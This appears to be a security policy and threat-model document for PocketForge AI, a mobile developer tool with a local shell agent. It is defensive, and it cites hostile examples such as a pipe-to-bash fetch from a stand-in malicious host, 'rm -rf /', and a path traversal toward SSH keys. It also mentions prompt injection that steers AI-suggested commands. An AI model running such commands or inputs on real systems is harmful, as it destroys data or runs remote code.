# 🛡️ POCKETFORGE AI - Security Architecture & Policy

Security is a primary pillar of PocketForge AI. Running local developer tools and executing shell commands on a mobile phone requires strict defenses against malicious code execution, credential exfiltration, and unauthorized local network access.

---

## 🔒 Security Threat Model & Mitigations

### 1. Localhost Isolation & Binding
- **Threat:** Malicious apps on the same Wi-Fi network attempt to connect to the developer server or execute commands on the phone.
- **Defense:**
  - The Termux Local Agent binds exclusively to `127.0.0.1` (loopback interface) by default.
  - External network devices on the LAN cannot access the agent port without explicit port forwarding.

### 2. Pairing Token Authentication
- **Threat:** Arbitrary websites in mobile tabs attempt to issue cross-origin requests to `localhost:8765`.
- **Defense:**
  - All protected agent endpoints require an `Authorization: Bearer <token>` header.
  - The pairing token is generated cryptographically using `crypto.randomBytes(16)` and stored in a chmod `0600` file inside `~/.pocketforge/token`.
  - Simple CORS pre-flight validation prevents cross-origin web script attacks.

### 3. Directory Traversal Defense
- **Threat:** Path manipulation parameters such as `../../../../system/bin` or `../../.ssh/id_rsa` to read or overwrite critical files.
- **Defense:**
  - All file and directory paths passed into `pocketforge-agent.js` are resolved and validated with `path.resolve()`.
  - If the resolved absolute path does not start with the designated workspace root directory, the request is immediately rejected with HTTP 400 (`Access denied: Path traversal detected`).

### 4. Explicit AI Command Approval Checkpoint
- **Threat:** AI Hallucination or prompt injection suggests destructive shell commands (e.g. `rm -rf /`, `curl malicious.site | bash`).
- **Defense:**
  - **Zero Silent Executions:** The PocketForge frontend will **never** execute an AI-suggested command automatically.
  - A modal dialog appears displaying the exact command, target directory, and explanation.
  - The user must explicitly inspect and tap **"Approve & Execute"** or **"Reject"**.
  - The local agent also enforces a safety filter blocking catastrophic fork-bombs and raw device writes.

### 5. Safe Export & Secret Scrubbing
- **Threat:** Projects exported as ZIP or prepared for Linux Mint accidentally leak `.env` API keys or GitHub tokens.
- **Defense:**
  - The ZIP export pipeline inspects file manifests and excludes `.env`, `*.key`, `*.pem`, `id_rsa`, and secrets from output archives unless explicitly confirmed.
  - `.gitignore` templates are injected automatically.

### 6. No Secret Logging
- **Threat:** Terminal logs or AI response transcripts accidentally print API keys to disk.
- **Defense:**
  - Token and key patterns (Gemini keys `AIza...`, GitHub PATs `github_pat_...`, Groq keys `gsk_...`) are redacted in log display widgets.

---

## 🚨 Reporting a Vulnerability

If you discover a potential security vulnerability in PocketForge AI:
1. Please do not open a public issue.
2. Email security concerns to: `security@pocketforge.dev` (or open a private security advisory on GitHub).
3. We acknowledge reports within 24 hours and patch high-severity issues promptly.
